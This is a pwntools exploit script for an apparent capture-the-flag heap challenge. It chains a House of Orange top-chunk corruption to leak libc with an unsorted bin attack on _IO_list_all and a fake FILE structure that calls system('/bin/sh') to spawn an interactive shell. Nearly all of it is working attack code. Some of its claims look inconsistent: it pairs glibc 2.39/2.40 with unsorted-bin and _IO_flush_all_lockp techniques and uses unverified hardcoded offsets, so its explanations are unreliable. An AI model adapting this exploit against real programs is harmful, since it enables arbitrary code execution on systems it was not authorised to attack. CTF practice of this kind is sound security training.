#!/usr/bin/env python3
from pwn import *

# --- Configuration (Adjust paths if needed) ---
exe_path = "./chal"
libc_path = "./libc.so.6"
ld_path = "./ld-linux-x86-64.so.2"

try:
    exe = ELF(exe_path)
    libc = ELF(libc_path)
    ld = ELF(ld_path)
except Exception as e:
    log.error(f"Could not load ELF files: {e}. Ensure all files are in the current directory.")
    exit()

# Set context arch/os for cleaner p64/u64
context.binary = exe
context.log_level = 'info'
# This ensures GDB opens in a new Tmux pane when attached
context.terminal = ["tmux", "splitw", "-h"] 

# --- GLIBC Offsets (Verify these in GDB for your specific libc.so.6) ---
# Offset from main_arena + 96 to libc base (Common for Glibc 2.39/2.40)
LIBC_OFFSET = 0x21ace0 

# --- Helper Functions ---

def conn():
    # Use the process context when running with 'LOCAL' argument
    io = process([ld_path, exe_path], env={"LD_PRELOAD": libc_path})
    
    # --- AUTOMATIC GDB ATTACHMENT ---
    if args.LOCAL:
        gdbscript = '''
            # Break on the function that handles chunk allocation/splitting
            b _int_malloc
            # Break on the function that handles freeing (where the Top Chunk is internally freed)
            b _int_free
            # Break on the 'edit' function (where the unlimited overflow happens)
            b edit
            
            # Continue execution from the attachment point
            c
        '''
        log.info(f"Attaching GDB to PID: {io.pid}")
        # Attach GDB and execute the script in a new pane
        gdb.attach(io, gdbscript=gdbscript)
    # ----------------------------------

    return io

def allocate(idx, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Index (0-19): ", str(idx).encode())
    io.sendlineafter(b"Size: ", str(size).encode())

def edit(idx, data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Index (0-19): ", str(idx).encode())
    io.sendlineafter(b"Data: ", data)
    # Note: We skip receiving "Done." to prevent hanging if the program crashes.

def show(idx):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"Index (0-19): ", str(idx).encode())
    io.recvuntil(b"Content: ")
    leak = io.recvuntil(b"\n")[:-1]
    return leak

# --- Exploit Start ---
io = conn()

# =============================================================================
# PHASE 1: HOUSE OF ORANGE - LEAK LIBC & HEAP (Optimized for stability)
# =============================================================================
log.info("--- Phase 1: Leaking Libc & Heap ---")

# 1. Allocate the minimum size (8 bytes) to result in a 0x20 chunk.
allocate(0, 8) 

# 2. Corrupt Top Chunk Size 
# The minimal chunk size means the total offset to Top Chunk Size is 24 bytes.
# Math: 8 (user data) + 8 (padding) + 8 (Top Prev Size) = 24 bytes
# We use 0xc01 for the Top size (0xc00 + P-bit) to pass integrity checks.
payload = b"A" * 24          # Overwrite Prev Size of Top Chunk
payload += p64(0xc01)        # Corrupted Top Chunk Size
edit(0, payload)

# 3. Trigger sysmalloc
# Requesting size > 0xc00 forces the old Top Chunk (size 0xc00) into Unsorted Bin.
allocate(1, 0x1000) 

# 4. Leak Libc
# Chunk 2 takes 0x20 bytes from the Unsorted Bin.
allocate(2, 24)
leak = show(2)

# The leak is the 'fd' pointer of the unsorted bin, pointing to main_arena + 96.
libc_leak = u64(leak[8:16].ljust(8, b'\x00'))
libc.address = libc_leak - LIBC_OFFSET
log.success(f"Libc Leak: {hex(libc_leak)}")
log.success(f"Libc Base: {hex(libc.address)}")

# Update global targets now that libc.address is known
IO_LIST_ALL = libc.symbols['_IO_list_all']
SYSTEM = libc.symbols['system']
WFILE_JUMPS = libc.address + 0x2160c0 # Verify this address

# =============================================================================
# PHASE 2: UNSORTED BIN ATTACK (FSOP)
# =============================================================================
log.info("--- Phase 2: Unsorted Bin Attack Setup ---")

# 1. Corrupt Top Chunk Size AGAIN (Chunk 2 overflows)
# Total offset to Top Chunk Size is 24 bytes from Chunk 2 user data start.
payload_top = b"B" * 24
payload_top += p64(0xc01) 
edit(2, payload_top)

# 2. Free current Top into Unsorted Bin (Chunk 3 is created)
allocate(3, 0x1000)

# 3. Overwrite BK pointer for Unsorted Bin Attack
# We overflow from Chunk 2 (allocated) into Chunk 3 (freed Top Chunk).
# The BK of Chunk 3 is at offset +0x18 relative to its own chunk header (0x0).
# The overflow target starts at +0x20 from Chunk 2's user data start (0x0).
# The BK of Chunk 3 is at offset 0x38 from Chunk 2's user data start.

final_overflow = flat({
    0x00: b'D' * 40,                    # Padding to Top Chunk Header
    0x28: 0xd01,                        # Chunk 3 Size (size of freed chunk)
    0x30: p64(0xdeadbeef),              # FD 
    0x38: IO_LIST_ALL - 0x20,           # BK (THE ATTACK TARGET)
    # Fake FILE content (House of Apple 2 structure):
    0x40: u64(b"/bin/sh\x00"),          # _flags (used as system command argument)
    0x48: SYSTEM,                       # Placeholder/Target for function call
    0x100: 0x0                          # Padding
}, filler=b'\x00')

edit(2, final_overflow)

# 4. Trigger the attack
# Allocation triggers the Unsorted Bin sorting/allocating, executing the BK attack.
# _IO_list_all is overwritten with main_arena address.
allocate(4, 24) 

# 5. Trigger Exit (Implicitly via invalid option)
# This calls _IO_flush_all_lockp which walks the overwritten file list and executes the payload.
log.info("--- Phase 3: Triggering FSOP ---")
io.sendlineafter(b"> ", b"5") # Send invalid option to exit main loop and call exit(0)

io.interactive()